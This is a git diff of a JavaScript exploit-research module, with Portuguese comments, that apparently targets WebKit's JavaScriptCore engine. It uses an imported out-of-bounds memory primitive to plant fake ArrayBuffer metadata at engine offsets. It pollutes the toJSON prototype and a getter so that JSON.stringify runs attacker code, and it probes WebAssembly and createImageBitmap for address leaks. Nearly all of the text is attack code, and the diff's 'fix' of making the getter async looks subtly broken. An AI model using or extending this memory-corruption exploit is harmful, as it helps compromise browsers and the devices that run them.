@@ -11,21 +11,20 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForApiTest";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForApiTest"; // Usado na última versão do teste
 let getter_called_flag = false;
 let current_test_results = { success: false, message: "Teste não iniciado.", error: null, info: null };
 
-// Metadados sombra (podem não ser usados diretamente, mas mantemos a configuração)
 const SHADOW_DATA_POINTER = new AdvancedInt64(0x1, 0x0);
 const SHADOW_SIZE = new AdvancedInt64(0x1000, 0x0);
 
-class CheckpointObjectForApiTest {
+class CheckpointObjectForApiTest { // Usado na última versão do teste
     constructor(id) {
         this.id = `ApiTestCheckpoint-${id}`;
     }
 }
 
-export function toJSON_TriggerApiTestGetter() {
+export function toJSON_TriggerApiTestGetter() { // Usado na última versão do teste
     const FNAME_toJSON = "toJSON_TriggerApiTestGetter";
     if (this instanceof CheckpointObjectForApiTest) {
         logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
@@ -39,14 +38,21 @@ export function toJSON_TriggerApiTestGetter() {
     return this.id;
 }
 
-export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST = "executeApiInteractionTest"; // Nome interno
+// A função exportada mantém o nome para compatibilidade com runAllAdvancedTestsS3.mjs
+export async function executeRetypeOOB_AB_Test() {
+    const FNAME_TEST = "executeApiInteractionTest"; // Nome interno da última versão do teste
     logS3(`--- Iniciando Teste de Interação com API no Getter ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
     current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, info: null };
 
-    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }
+    // Validação de Config (simplificada, assumindo que JSC_OFFSETS e suas subpropriedades necessárias existem)
+    if (!JSC_OFFSETS || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
+        logS3("Offsets críticos não definidos em config.mjs. Abortando teste.", "critical", FNAME_TEST);
+        current_test_results.message = "Offsets críticos não definidos.";
+        // Adicione um log de console mais detalhado aqui se necessário para depurar config.mjs
+        return;
+    }
 
     let toJSONPollutionApplied = false;
     let getterPollutionApplied = false;
@@ -56,10 +62,14 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
+        if (!oob_array_buffer_real || !oob_dataview_real) {
+            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
+            logS3(current_test_results.message, "critical", FNAME_TEST);
+            return;
+        }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // 1. Plantar "Metadados Sombra"
+        // 1. Plantar "Metadados Sombra" (ArrayBufferContents falsos)
         const shadow_contents_offset_in_oob_data = 0x0;
         oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE, 8);
         oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER, 8);
@@ -76,7 +86,8 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
         originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
 
         Object.defineProperty(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
-            get: function() {
+            // AQUI ESTÁ A CORREÇÃO: ADICIONADO 'async'
+            get: async function() {
                 getter_called_flag = true;
                 const FNAME_GETTER = "ApiTest_Getter";
                 logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando APIs...`, "vuln", FNAME_GETTER);
@@ -85,36 +96,25 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
                 let info_observed = [];
 
                 // Teste 1: WebAssembly.Memory
-                // WebAssembly.Memory espera um descritor com 'initial' e opcionalmente 'maximum' e 'shared'.
-                // Passar um ArrayBuffer diretamente é um uso incorreto.
                 try {
                     logS3("DENTRO DO GETTER (API Test 1): new WebAssembly.Memory(oob_array_buffer_real)...", "info", FNAME_GETTER);
-                    // @ts-ignore  Intencionalmente passando tipo errado
+                    // @ts-ignore
                     let wa_mem = new WebAssembly.Memory(oob_array_buffer_real);
                     info_observed.push(`WebAssembly.Memory(oob_ab) SUCESSO INESPERADO. Buffer length: ${wa_mem.buffer?.byteLength}`);
                     logS3(`DENTRO DO GETTER (API Test 1): WebAssembly.Memory criado INESPERADAMENTE. Buffer: ${wa_mem.buffer}`, "warn", FNAME_GETTER);
                 } catch (e) {
                     info_observed.push(`WebAssembly.Memory(oob_ab) Erro: ${e.message}`);
                     logS3(`DENTRO DO GETTER (API Test 1): Erro esperado com WebAssembly.Memory(oob_ab): ${e.message}`, "good", FNAME_GETTER);
-                    if (String(e.message).length > 100 || String(e.message).includes("0x")) { // Heurística para erro verboso
-                        current_test_results.success = true; // Sucesso especulativo se o erro for muito detalhado
+                    if (String(e.message).length > 100 || String(e.message).includes("0x")) {
+                        current_test_results.success = true;
                         current_test_results.message = "WebAssembly.Memory causou erro potencialmente informativo.";
                     }
                 }
 
-                // Teste 2: PostMessage (comum para transferir ArrayBuffers)
+                // Teste 2: PostMessage (simulado com slice)
                 try {
                     logS3("DENTRO DO GETTER (API Test 2): self.postMessage(oob_array_buffer_real, '*')", "info", FNAME_GETTER);
-                    // @ts-ignore Verifica se postMessage está disponível (ex: em Worker ou main thread)
                     if (typeof self !== 'undefined' && self.postMessage) {
-                        // Para evitar erro "DataCloneError" se o AB estiver "detached" ou corrompido de forma estranha.
-                        // Precisaria de um MessageChannel para um teste mais robusto ou um worker.
-                        // Aqui apenas chamamos para ver se causa um erro imediato diferente do normal.
-                        // self.postMessage({ab_test: oob_array_buffer_real}, '*'); // Enviar como parte de um objeto
-                        // Se o ArrayBuffer for transferível e corrompido, pode dar um erro interessante.
-                        // Para simplificar e evitar dependência de setup de worker, vamos apenas simular
-                        // uma operação que poderia falhar de forma interessante se o AB estiver esquisito.
-                        // Tentando um slice, que já testamos, mas o contexto é diferente.
                         let slice = oob_array_buffer_real.slice(0,1);
                         info_observed.push(`postMessage-like (slice): slice.byteLength = ${slice.byteLength}`);
                          logS3(`DENTRO DO GETTER (API Test 2): Slice para simular postMessage OK. Length: ${slice.byteLength}`, "info", FNAME_GETTER);
@@ -132,22 +132,18 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
                 }
                 
                 // Teste 3: ImageBitmap (se disponível)
-                // createImageBitmap pode ter tratamento especial para ArrayBuffers (ex: pixel data)
-                // @ts-ignore Verifica se createImageBitmap está disponível
                 if (typeof createImageBitmap !== 'undefined') {
                     try {
                         logS3("DENTRO DO GETTER (API Test 3): createImageBitmap(oob_dataview_real)... (esperando erro)", "info", FNAME_GETTER);
-                        // createImageBitmap espera ImageData, Blob, etc. Passar DataView diretamente é incorreto.
-                        // Ou um objeto { data: ArrayBufferView, width: number, height: number }
                         // @ts-ignore
-                        await createImageBitmap(oob_dataview_real); // Passando DataView
+                        await createImageBitmap(oob_dataview_real); // Esta é a linha que necessita do 'async' no getter
                         info_observed.push(`createImageBitmap(oob_dv) SUCESSO INESPERADO.`);
                         logS3(`DENTRO DO GETTER (API Test 3): createImageBitmap com oob_dataview_real INESPERADAMENTE bem-sucedido.`, "warn", FNAME_GETTER);
                     } catch (e) {
                         info_observed.push(`createImageBitmap(oob_dv) Erro: ${e.message}`);
                         logS3(`DENTRO DO GETTER (API Test 3): Erro esperado com createImageBitmap(oob_dv): ${e.message}`, "good", FNAME_GETTER);
                         if (String(e.message).length > 80 || String(e.message).includes("0x") || String(e.message).toLowerCase().includes("internal error")) {
-                            current_test_results.success = true; // Sucesso especulativo se o erro for muito detalhado
+                            current_test_results.success = true;
                             current_test_results.message = "createImageBitmap causou erro potencialmente informativo.";
                         }
                     }
@@ -156,9 +152,8 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
                     logS3("DENTRO DO GETTER (API Test 3): createImageBitmap não disponível.", "warn", FNAME_GETTER);
                 }
 
-
                 current_test_results.info = info_observed.join('; ');
-                if (!current_test_results.success) { // Se nenhum dos testes acima marcou sucesso
+                if (!current_test_results.success) {
                     current_test_results.message = "Testes de API no getter não revelaram leaks óbvios ou crashes controlados.";
                 }
                 return 0xBADF00D;
@@ -179,14 +174,33 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
             logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
         }
 
-    } catch (mainError) { /* ... erro principal ... */ }
-    finally { /* ... limpeza ... */ }
+    } catch (mainError) {
+        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
+        console.error(mainError);
+        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
+    } finally {
+        // Restauração
+        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) {
+            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
+            else delete Object.prototype[ppKey_val];
+        }
+        if (getterPollutionApplied && CheckpointObjectForApiTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
+            if (originalGetterDesc) Object.defineProperty(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
+            else delete CheckpointObjectForApiTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
+        }
+        logS3("Limpeza finalizada.", "info", "CleanupFinal");
+    }
 
     if (getter_called_flag) {
         logS3(`RESULTADO TESTE API: Getter chamado. Sucesso especulativo: ${current_test_results.success}. Msg: ${current_test_results.message}. Info: ${current_test_results.info}`, 
               current_test_results.success ? "vuln" : "warn", FNAME_TEST);
-    } else { /* ... getter não chamado ... */ }
-    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
+    } else {
+        logS3("RESULTADO TESTE API: Getter NÃO foi chamado.", "error", FNAME_TEST);
+         // Se o getter não foi chamado, current_test_results pode ter a mensagem de "teste não executado"
+        logS3(`  Detalhes do erro (se houver): ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
+    }
+    // Log dos detalhes finais mesmo se o getter não foi chamado, pois pode conter erro de setup.
+    logS3(`  Detalhes finais da tentativa: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
 
     clearOOBEnvironment();
     logS3(`--- Teste de Interação com API Concluído ---`, "test", FNAME_TEST);
